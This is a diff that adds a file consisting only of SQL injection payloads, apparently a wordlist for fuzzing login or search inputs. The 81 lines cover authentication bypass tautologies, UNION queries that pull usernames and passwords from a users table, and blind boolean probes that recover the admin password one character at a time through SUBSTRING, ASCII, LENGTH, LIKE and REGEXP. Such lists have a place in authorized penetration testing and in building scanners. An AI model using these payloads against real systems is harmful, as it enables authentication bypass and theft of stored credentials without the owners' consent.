@@ -1,0 +1,81 @@
+' AND (SELECT * FROM users WHERE username='admin' AND password='test')--
+' OR (SELECT * FROM users WHERE username='admin' AND password='test')--
+' UNION SELECT * FROM users WHERE username='admin' AND password='test'--
+admin' AND password='test
+admin' OR '1'='1
+admin' OR 1=1--
+admin' AND 1=1--
+admin' UNION SELECT NULL,NULL,NULL--
+admin' UNION SELECT username,password,NULL FROM users--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+' AND EXISTS(SELECT * FROM users WHERE username='admin')--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' AND (SELECT password FROM users WHERE username='admin')='test'--
+' OR (SELECT password FROM users WHERE username='admin')='test'--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--
+' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' OR (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' UNION SELECT username,password FROM users WHERE username='admin'--
+' UNION SELECT NULL,username,password FROM users WHERE username='admin'--
+' UNION SELECT username,password,NULL FROM users WHERE username='admin'--
+' UNION SELECT CONCAT(username,0x3a,password) FROM users WHERE username='admin'--
+' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users WHERE username='admin'--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password REGEXP '^a')--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password REGEXP '^a')--
+' AND (SELECT 1 FROM users WHERE username='admin' AND BINARY password='test')--
+' OR (SELECT 1 FROM users WHERE username='admin' AND BINARY password='test')--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password=BINARY 'test')--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password=BINARY 'test')--
+' AND (SELECT 1 FROM users WHERE username='admin' AND HEX(password)=HEX('test'))--
+' OR (SELECT 1 FROM users WHERE username='admin' AND HEX(password)=HEX('test'))--
+' AND (SELECT 1 FROM users WHERE username='admin' AND MD5(password)=MD5('test'))--
+' OR (SELECT 1 FROM users WHERE username='admin' AND MD5(password)=MD5('test'))--
+' AND (SELECT 1 FROM users WHERE username='admin' AND SHA1(password)=SHA1('test'))--
+' OR (SELECT 1 FROM users WHERE username='admin' AND SHA1(password)=SHA1('test'))--
+' UNION SELECT * FROM users WHERE username='admin' AND password='test' LIMIT 1--
+' UNION SELECT * FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1--
+' UNION SELECT * FROM users WHERE username='admin' AND password REGEXP '^a' LIMIT 1--
+' UNION SELECT * FROM users WHERE username='admin' ORDER BY password LIMIT 1--
+' UNION SELECT * FROM users WHERE username='admin' ORDER BY password DESC LIMIT 1--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='test')>0--
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND password='test')>0--
+' AND (SELECT MAX(id) FROM users WHERE username='admin')>0--
+' OR (SELECT MAX(id) FROM users WHERE username='admin')>0--
+' AND (SELECT MIN(id) FROM users WHERE username='admin')>0--
+' OR (SELECT MIN(id) FROM users WHERE username='admin')>0--
+' AND (SELECT SUM(id) FROM users WHERE username='admin')>0--
+' OR (SELECT SUM(id) FROM users WHERE username='admin')>0--
+' AND (SELECT AVG(id) FROM users WHERE username='admin')>0--
+' OR (SELECT AVG(id) FROM users WHERE username='admin')>0--
+' UNION SELECT COUNT(*),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT MAX(id),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT MIN(id),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT SUM(id),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT AVG(id),NULL,NULL FROM users WHERE username='admin'--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password IN ('test','admin','password'))--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password IN ('test','admin','password'))--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password BETWEEN 'a' AND 'z')--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password BETWEEN 'a' AND 'z')--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password IS NOT NULL)--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password IS NOT NULL)--
+' AND (SELECT 1 FROM users WHERE username='admin' AND password IS NULL)--
+' OR (SELECT 1 FROM users WHERE username='admin' AND password IS NULL)--
+' UNION SELECT * FROM users WHERE username='admin' AND password IN ('test','admin','password')--
+' UNION SELECT * FROM users WHERE username='admin' AND password BETWEEN 'a' AND 'z'--
+' UNION SELECT * FROM users WHERE username='admin' AND password IS NOT NULL--
+' UNION SELECT * FROM users WHERE username='admin' AND password IS NULL--
+' AND (SELECT 1 FROM users WHERE username='admin' AND CHAR_LENGTH(password)>5)--
+' OR (SELECT 1 FROM users WHERE username='admin' AND CHAR_LENGTH(password)>5)--
+' AND (SELECT 1 FROM users WHERE username='admin' AND BIT_LENGTH(password)>40)--
+' OR (SELECT 1 FROM users WHERE username='admin' AND BIT_LENGTH(password)>40)--
+' AND (SELECT 1 FROM users WHERE username='admin' AND OCTET_LENGTH(password)>5)--
+' OR (SELECT 1 FROM users WHERE username='admin' AND OCTET_LENGTH(password)>5)--
+' UNION SELECT CHAR_LENGTH(password),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT BIT_LENGTH(password),NULL,NULL FROM users WHERE username='admin'--
+' UNION SELECT OCTET_LENGTH(password),NULL,NULL FROM users WHERE username='admin'--
